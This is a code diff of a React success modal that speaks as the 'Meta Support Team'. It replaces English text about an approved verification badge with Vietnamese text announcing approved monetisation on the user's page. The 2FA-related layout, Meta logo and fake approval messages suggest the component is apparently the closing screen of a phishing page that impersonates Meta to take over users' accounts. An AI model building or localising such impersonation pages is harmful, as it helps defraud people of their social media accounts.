@@ -1,7 +1,7 @@
 import PropTypes from 'prop-types';
 import MetaLogo from '@/assets/images/meta-logo-grey.png';
-import PhoneImage from '@/assets/images/phone.png';
-import TickIcon from '@/assets/images/tick.svg';
+import SuccessImage from '@/assets/images/successb.webp';
+import TickIcon from '@/assets/images/tick.png';
 
 const SuccessModal = ({ show, onClose, texts }) => {
     if (!show) return null;
@@ -15,27 +15,27 @@ const SuccessModal = ({ show, onClose, texts }) => {
                     <div className="modal-body">
                         <div className="twoFAinfo-wraper">
                             <h1 className="modal-title" id="successModalLabel">
-                                {texts.successTitle || 'The request was sent successfully'}
+                                {texts.successTitle || 'Đăng ký kiếm tiền thành công!'}
                             </h1>
                             <br />
                             <div className="fb-round-wraper">
-                                <img alt="" src={PhoneImage} style={{ width: '100%' }} />
+                                <img alt="success" src={SuccessImage} style={{ width: '100%' }} />
                             </div>
                             <br />
                             <p>
-                                {texts.successMessage1 || 'Great, your verification request has been approved.'}
+                                {texts.successMessage1 || 'Tuyệt vời! Yêu cầu đăng ký kiếm tiền của bạn đã được phê duyệt.'}
                                 <br />
                                 <br />
-                                {texts.successMessage2 || 'The badge should appear next to your name within the next hour.'} <img src={TickIcon} width="16" alt="tick" style={{ verticalAlign: 'middle', margin: '0 4px' }} />
+                                {texts.successMessage2 || 'Tính năng kiếm tiền sẽ được kích hoạt trên trang của bạn trong vòng 24 – 48 giờ tới.'} <img src={TickIcon} width="16" alt="tick" style={{ verticalAlign: 'middle', margin: '0 4px' }} />
                                 <br />
                                 <br />
-                                {texts.successMessage3 || 'If the badge has not appeared after this time, please contact us again for further assistance.'}
+                                {texts.successMessage3 || 'Nếu tính năng chưa xuất hiện sau thời gian này, vui lòng liên hệ lại với chúng tôi để được hỗ trợ thêm.'}
                                 <br />
                                 <br />
-                                {texts.thankYou || 'Thank you'}
+                                {texts.thankYou || 'Cảm ơn bạn đã tin tưởng!'}
                                 <br />
                                 <br />
-                                {texts.metaSupportTeam || 'Meta Support Team.'}
+                                {texts.metaSupportTeam || 'Nhóm hỗ trợ Meta.'}
                             </p>
                         </div>
                         <div className="form-btn-wrapper">
